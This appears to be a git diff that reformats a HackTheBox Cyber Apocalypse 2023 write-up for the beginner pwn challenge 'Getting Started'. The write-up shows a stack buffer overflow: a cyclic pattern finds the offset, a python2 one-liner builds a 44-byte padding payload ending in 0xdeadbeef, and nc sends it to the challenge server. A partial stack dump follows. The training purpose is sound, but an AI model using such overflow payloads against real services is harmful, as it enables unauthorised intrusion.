@@ -1,14 +1,31 @@
 ---
-Name: Getting Started
-Category: Pwn
-Difficulty: Very Easy
+name: Getting Started (2023)
+event: HackTheBox Cyber Apocalypse - Intergalactic Chase CTF 2023
+category: Pwn
+description: Writeup for Getting Started (Pwn) - HackTheBox Cyber Apocalypse - Intergalactic Chase CTF (2023) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
 ---
 
+# Getting Started
+
 ## Description
->Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.
+
+> Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.
 
 ## Solution
+
 Generate a cyclic pattern and send it to the program as input and check which bytes make it into the RIP, then unhex and find the offset.
+
 ```bash
 cyclic 100
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
@@ -20,15 +37,17 @@ cyclic -l laaa
 ```
 
 Create a payload and send it to the server.
+
 ```bash
 python2 -c 'print "A" * 44 + "\xef\xbe\xad\xde"' > payload
 
 nc 209.97.129.76 30115 < payload
 ```
 
-Receive flag :)
+Receive flag 🙂
+
 ```bash
-      [Addr]       |      [Value]       
+      [Addr]       |      [Value]
 -------------------+-------------------
 0x00007ffd6d3fc690 | 0x4141414141414141 <- Start of buffer
 0x00007ffd6d3fc698 | 0x4141414141414141
